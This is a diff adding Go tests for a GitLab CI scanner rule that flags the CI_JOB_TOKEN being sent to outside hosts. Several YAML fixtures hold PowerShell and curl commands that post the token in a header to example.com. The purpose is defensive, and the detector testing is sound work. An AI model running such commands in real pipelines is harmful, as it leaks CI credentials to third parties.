@@ -89,6 +89,77 @@ upload:
 	}
 }
 
+func TestGL004_PowerShellEnvForm(t *testing.T) {
+	f := findings004(t, `
+upload:
+  tags: [windows]
+  script:
+    - 'Invoke-WebRequest -Headers @{"JOB-TOKEN"=$env:CI_JOB_TOKEN} https://example.com/upload'
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding for PowerShell $env:CI_JOB_TOKEN, got %d: %v", len(f), f)
+	}
+}
+
+func TestGL004_PowerShellBraceEnvForm(t *testing.T) {
+	f := findings004(t, `
+upload:
+  tags: [windows]
+  script:
+    - 'Invoke-RestMethod -Uri https://example.com/upload -Headers @{"JOB-TOKEN"=${env:CI_JOB_TOKEN}}'
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding for PowerShell ${env:CI_JOB_TOKEN}, got %d: %v", len(f), f)
+	}
+}
+
+func TestGL004_PowerShellLowercaseEnvForm(t *testing.T) {
+	f := findings004(t, `
+upload:
+  tags: [windows]
+  script:
+    - 'iwr -Headers @{"JOB-TOKEN"=$env:ci_job_token} https://example.com/upload'
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding for lowercase PowerShell $env:ci_job_token, got %d: %v", len(f), f)
+	}
+}
+
+func TestGL004_PowerShellAliasIRM(t *testing.T) {
+	f := findings004(t, `
+upload:
+  tags: [windows]
+  script:
+    - 'irm https://example.com/upload -Headers @{"JOB-TOKEN"=$Env:CI_JOB_TOKEN}'
+`)
+	if len(f) != 1 {
+		t.Fatalf("expected 1 finding for irm with $Env:CI_JOB_TOKEN, got %d: %v", len(f), f)
+	}
+}
+
+func TestGL004_PowerShellGitLabSafe(t *testing.T) {
+	f := findings004(t, `
+download:
+  tags: [windows]
+  script:
+    - 'Invoke-WebRequest -Headers @{"JOB-TOKEN"=$env:CI_JOB_TOKEN} https://gitlab.com/api/v4/projects/1/packages'
+`)
+	if len(f) != 0 {
+		t.Errorf("expected no findings for PowerShell token to gitlab.com, got %d: %v", len(f), f)
+	}
+}
+
+func TestGL004_PosixLowercaseNoFinding(t *testing.T) {
+	f := findings004(t, `
+upload:
+  script:
+    - 'curl -H "JOB-TOKEN: $ci_job_token" https://example.com/upload'
+`)
+	if len(f) != 0 {
+		t.Errorf("expected no findings for lowercase POSIX $ci_job_token, got %d: %v", len(f), f)
+	}
+}
+
 func TestGL004_BeforeScript(t *testing.T) {
 	f := findings004(t, `
 build:
